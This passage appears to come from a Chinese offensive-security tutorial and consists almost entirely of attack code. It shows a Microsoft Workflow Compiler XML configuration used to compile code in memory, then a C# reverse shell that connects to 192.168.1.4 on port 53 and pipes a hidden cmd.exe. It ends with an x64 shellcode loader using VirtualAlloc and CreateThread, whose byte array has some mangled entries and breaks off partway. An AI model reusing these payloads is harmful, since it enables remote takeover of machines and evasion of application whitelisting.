<span class="token operator">&lt;</span>generateExecutable xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span><span class="token operator">&gt;</span>false<span class="token operator">&lt;</span><span class="token operator">/</span>generateExecutable<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>generateInMemory xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span><span class="token operator">&gt;</span>true<span class="token operator">&lt;</span><span class="token operator">/</span>generateInMemory<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>includeDebugInformation xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span><span class="token operator">&gt;</span>false<span class="token operator">&lt;</span><span class="token operator">/</span>includeDebugInformation<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>linkedResources xmlns<span class="token punctuation">:</span>d3p1<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>mainClass i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>outputName xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>outputName<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>tempFiles i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>treatWarningsAsErrors xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span><span class="token operator">&gt;</span>false<span class="token operator">&lt;</span><span class="token operator">/</span>treatWarningsAsErrors<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>warningLevel xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span><span class="token operator">&gt;</span>‐<span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>warningLevel<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>win32Resource i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> xmlns<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>checkTypes<span class="token operator">&gt;</span>false<span class="token operator">&lt;</span><span class="token operator">/</span>d2p1<span class="token punctuation">:</span>checkTypes<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>compileWithNoCode<span class="token operator">&gt;</span>false<span class="token operator">&lt;</span><span class="token operator">/</span>d2p1<span class="token punctuation">:</span>compileWithNoCode<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>compilerOptions i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>generateCCU<span class="token operator">&gt;</span>false<span class="token operator">&lt;</span><span class="token operator">/</span>d2p1<span class="token punctuation">:</span>generateCCU<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>languageToUse<span class="token operator">&gt;</span>CSharp<span class="token operator">&lt;</span><span class="token operator">/</span>d2p1<span class="token punctuation">:</span>languageToUse<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>libraryPaths xmlns<span class="token punctuation">:</span>d3p1<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span> i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>localAssembly xmlns<span class="token punctuation">:</span>d3p1<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.Reflection"</span> i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>mtInfo i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>d2p1<span class="token punctuation">:</span>userCodeCCUs xmlns<span class="token punctuation">:</span>d3p1<span class="token operator">=</span><span class="token string">"http://schemas.datacontract.org/2004/07/System.CodeDom"</span> i<span class="token punctuation">:</span>nil<span class="token operator">=</span><span class="token string">"true"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>parameters<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">/</span>CompilerInput<span class="token operator">&gt;</span>
</code></pre>
<p><strong>Micropoor.tcp：</strong></p>
<pre><code class="prism language-c">using System<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Text<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>IO<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>ComponentModel<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Activities<span class="token punctuation">;</span> 

public class Program <span class="token punctuation">:</span> SequentialWorkflowActivity

<span class="token punctuation">{</span>

<span class="token keyword">static</span> StreamWriter streamWriter<span class="token punctuation">;</span> 

public <span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

<span class="token function">using</span><span class="token punctuation">(</span>TcpClient client <span class="token operator">=</span> new <span class="token function">TcpClient</span><span class="token punctuation">(</span><span class="token string">"192.168.1.4"</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

<span class="token function">using</span><span class="token punctuation">(</span>Stream stream <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">GetStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

<span class="token function">using</span><span class="token punctuation">(</span>StreamReader rdr <span class="token operator">=</span> new <span class="token function">StreamReader</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

streamWriter <span class="token operator">=</span> new <span class="token function">StreamWriter</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span> 

StringBuilder strInput <span class="token operator">=</span> new <span class="token function">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

Process p <span class="token operator">=</span> new <span class="token function">Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>CreateNoWindow <span class="token operator">=</span> true<span class="token punctuation">;</span>

p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> false<span class="token punctuation">;</span>

p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> true<span class="token punctuation">;</span>

p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardInput <span class="token operator">=</span> true<span class="token punctuation">;</span>

p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError <span class="token operator">=</span> true<span class="token punctuation">;</span>

p<span class="token punctuation">.</span>OutputDataReceived <span class="token operator">+</span><span class="token operator">=</span> new <span class="token function">DataReceivedEventHandler</span><span class="token punctuation">(</span>CmdOutputDataHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span><span class="token function">BeginOutputReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token keyword">while</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span>

<span class="token punctuation">{</span>

strInput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>rdr<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

p<span class="token punctuation">.</span>StandardInput<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strInput<span class="token punctuation">)</span><span class="token punctuation">;</span>

strInput<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> strInput<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span> 

private <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">CmdOutputDataHandler</span><span class="token punctuation">(</span>object sendingProcess<span class="token punctuation">,</span> DataReceivedEventArgs outLine<span class="token punctuation">)</span>

<span class="token punctuation">{</span>

StringBuilder strOutput <span class="token operator">=</span> new <span class="token function">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>String<span class="token punctuation">.</span><span class="token function">IsNullOrEmpty</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>

try

<span class="token punctuation">{</span>

strOutput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>

streamWriter<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strOutput<span class="token punctuation">)</span><span class="token punctuation">;</span>

streamWriter<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

catch <span class="token punctuation">(</span>Exception err<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token punctuation">}</span> 

<span class="token punctuation">}</span>
</code></pre>
<p><strong>Micropoor_rev1.cs</strong>：<br>
注：x64 payload</p>
<pre><code class="prism language-c">using System<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Workflow<span class="token punctuation">.</span>Activities<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Net<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">;</span>

using System<span class="token punctuation">.</span>Threading<span class="token punctuation">;</span>

class yrDaTlg <span class="token punctuation">:</span> SequentialWorkflowActivity <span class="token punctuation">{</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>UInt32 rCfMkmxRSAakg<span class="token punctuation">,</span>UInt32 qjRsrljIMB<span class="token punctuation">,</span> UInt32 peXiTuE<span class="token punctuation">,</span> UInt32 AkpADfOOAVBZ<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> public <span class="token keyword">static</span> <span class="token keyword">extern</span> bool <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>IntPt rDStOGXQMMkP<span class="token punctuation">,</span> uint CzzIpcuQppQSTBJ<span class="token punctuation">,</span> uint JCFImGhkRqtwANx<span class="token punctuation">,</span> out uint exgVp Sg<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>private <span class="token keyword">static</span> <span class="token keyword">extern</span> IntPtr <span class="token function">CreateThread</span><span class="token punctuation">(</span>UInt32 eisuQbXKYbAvA<span class="token punctuation">,</span> UInt32 WQATOZaFz<span class="token punctuation">,</span> IntPtr AEGJQOn<span class="token punctuation">,</span>IntPtr SYcfyeeSgPl<span class="token punctuation">,</span> UInt32 ZSheqBwKtDf<span class="token punctuation">,</span> ref UInt32 SZtdSB<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">[</span><span class="token function">DllImport</span><span class="token punctuation">(</span><span class="token string">"kernel32"</span><span class="token punctuation">)</span><span class="token punctuation">]</span> private <span class="token keyword">static</span> <span class="token keyword">extern</span> UInt32 <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>IntPtr KqJNFlHpsKOV<span class="token punctuation">,</span> UInt32 EYBOArlCLAM<span class="token punctuation">)</span><span class="token punctuation">;</span>

public <span class="token function">yrDaTlg</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

byte<span class="token punctuation">[</span><span class="token punctuation">]</span> QWKpWKhcs <span class="token operator">=</span>

<span class="token punctuation">{</span><span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span>

<span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xd2</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span>x48<span class="token punctuation">,</span>

<span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0x4a</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span>xc9<span class="token punctuation">,</span>

<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0xe2</span><span class="token punctuation">,</span><span class="token number">0xed</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span>x48<span class="token punctuation">,</span>

<span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x0b</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>x8b<span class="token punctuation">,</span>

<span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>x8b<span class="token punctuation">,</span>

<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0xe3</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span>x41<span class="token punctuation">,</span>

<span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd6</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span>xc1<span class="token punctuation">,</span>

<span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span>x45<span class="token punctuation">,</span>

<span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0xd1</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xd8</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span>x8b<span class="token punctuation">,</span>

<span class="token number">0x0c</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span>x01<span class="token punctuation">,</span>

<span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span>x48<span class="token punctuation">,</span>

<span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span>xe9<span class="token punctuation">,</span>

<span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x5d</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xbe</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span>x00<span class="token punctuation">,</span>

<span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span>xe5<span class="token punctuation">,</span>

<span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xbc</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span>xe4<span class="token punctuation">,</span>

<span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xf1</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span>x68<span class="token punctuation">,</span>

<span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xba</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span>x0a<span class="token punctuation">,</span>

<span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span>x89<span class="token punctuation">,</span>

